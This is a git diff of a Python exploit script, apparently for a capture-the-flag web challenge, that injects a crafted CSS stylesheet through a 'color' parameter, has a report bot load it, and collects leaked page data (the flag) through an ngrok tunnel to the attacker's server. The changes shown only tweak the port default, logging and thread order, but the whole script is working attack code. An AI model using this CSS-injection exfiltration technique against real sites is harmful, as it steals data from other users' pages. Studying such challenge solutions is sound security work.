@@ -21,7 +21,9 @@ FONT = 'Liberation Mono'
 #TARGET_URL = 'http://3.110.153.60:80'
 #TARGET_URL = 'http://3.110.153.60:8000'
 TARGET_URL = 'http://127.0.0.1:8000'
-PORT = int(sys.argv[1])
+PORT = 8888
+if len(sys.argv)>1:
+    PORT = int(sys.argv[1])
 
 class S(BaseHTTPRequestHandler):
     def _set_response(self):
@@ -192,11 +194,13 @@ def create_stylesheet(n,selector,url):
 def send_stylesheet():
     http_tunnel = ngrok.connect(PORT)
     s=create_stylesheet(10,'div',http_tunnel.public_url)
-    open('test.html','w').write(f"<style>{s}</style><div>fv{{03Ya}}</div>")
+    #open('test.html','w').write(f"<style>{s}</style><div>fv{{03Ya}}</div>")
     color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
     #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
     color = quote_plus(f"?color={color}")
+    print("Sending request")
     res = requests.get(f"{TARGET_URL}/report?path={color}")
+    print("Sent request")
     #print(res.url)
 
 def receive_flag():
@@ -217,8 +221,8 @@ def receive_flag():
 def main():
     t1 = threading.Thread(target=send_stylesheet)
     t2 = threading.Thread(target=receive_flag)
-    t1.start()
     t2.start()
+    t1.start()
     t1.join()
     t2.join()
 
